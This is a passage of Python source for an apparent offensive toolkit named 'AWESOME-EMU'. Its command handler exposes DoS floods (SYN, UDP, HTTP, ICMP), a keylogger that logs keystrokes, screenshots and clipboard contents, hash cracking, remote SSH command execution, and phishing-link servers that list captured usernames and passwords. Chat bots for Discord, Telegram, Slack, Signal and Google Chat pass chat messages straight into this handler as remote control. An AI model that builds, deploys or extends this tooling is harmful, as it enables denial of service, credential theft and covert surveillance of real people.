            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        result = WgetCommands.quota(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_dns_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_dns_timeout <url> <seconds>'}
        result = WgetCommands.dns_timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_connect_timeout <url> <seconds>'}
        result = WgetCommands.connect_timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_read_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_read_timeout <url> <seconds>'}
        result = WgetCommands.read_timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_inet4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet4 <url>'}
        result = WgetCommands.inet4_only(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_inet6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet6 <url>'}
        result = WgetCommands.inet6_only(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_prefer_family(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_prefer_family <url> <family>'}
        result = WgetCommands.prefer_family(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_bind_address(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_bind_address <url> <address>'}
        result = WgetCommands.bind_address(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_dns_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_dns_cache <url>'}
        result = WgetCommands.no_dns_cache(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_http_keep_alive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_http_keep_alive <url>'}
        result = WgetCommands.no_http_keep_alive(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cache <url>'}
        result = WgetCommands.no_cache(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_cookies(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cookies <url>'}
        result = WgetCommands.no_cookies(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_load_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_load_cookies <url> <file>'}
        result = WgetCommands.load_cookies(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_keep_session_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_keep_session_cookies <url> <file>'}
        result = WgetCommands.keep_session_cookies(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_help(self, args: List[str]) -> Dict:
        result = WgetCommands.help()
        return {'success': result.success, 'output': result.output}
    
    def _wget_version(self, args: List[str]) -> Dict:
        result = WgetCommands.version()
        return {'success': result.success, 'output': result.output}
    
    # Network tools
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = NetworkTools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = NetworkTools.whois(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        result = NetworkTools.dns(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        result = self._generic(f'nslookup {args[0]}')
        return result
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [type]'}
        record_type = args[1] if len(args) > 1 else 'A'
        result = NetworkTools.dns(args[0], record_type)
        return {'success': result.success, 'output': result.output}
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = NetworkTools.location(args[0])
        if result.get('success'):
            output = f"📍 Location for {args[0]}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {args[0]}"}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            location = NetworkTools.location(ip)
            domain = NetworkTools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    # SSH commands
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # Traffic generation
    def _traffic(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # DOS attacks
    def _dos_syn(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # Keylogger
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.conn.execute(
            "SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,)
        ).fetchall()
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # Cracking
    def _crack(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    def _crack_md5(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_md5 <hash> [wordlist]'}
        return self._crack(['md5'] + args)
    
    def _crack_sha1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha1 <hash> [wordlist]'}
        return self._crack(['sha1'] + args)
    
    def _crack_sha256(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha256 <hash> [wordlist]'}
        return self._crack(['sha256'] + args)
    
    def _crack_ntlm(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_ntlm <hash> [wordlist]'}
        return self._crack(['ntlm'] + args)
    
    # Docker
    def _docker_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        result = self.docker.docker_info()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_ps(self, args: List[str]) -> Dict:
        result = self.docker.docker_ps()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_images(self, args: List[str]) -> Dict:
        result = self.docker.docker_images()
        return {'success': result['success'], 'output': result['output']}
    
    # IP management
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = NetworkTools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = NetworkTools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = NetworkTools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    # Social engineering
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} (Clicks: {l['clicks']})\n"
        return {'success': True, 'output': output}

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "discord_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🦅 AWESOME-EMU Response", description=f"```{output}```",
                                     color=0xFFFFFF)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")


class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "telegram_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('awesome_emu_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")


class SlackBot:
    """Slack bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "slack_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)


class WhatsAppBot:
    """WhatsApp bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "whatsapp_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + os.path.join(CONFIG_DIR, "whatsapp_session"))
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.WARNING}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")


class SignalBot:
    """Signal bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "signal_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config.get('phone_number', '')],
                    capture_output=True, text=True, timeout=30
                )
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config.get('phone_number', '')]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass


class GoogleChatBot:
    """Google Chat bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            config_file = os.path.join(CONFIG_DIR, "googlechat_config.json")
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False


class iMessageBot:
    """iMessage bot integration (macOS only)"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
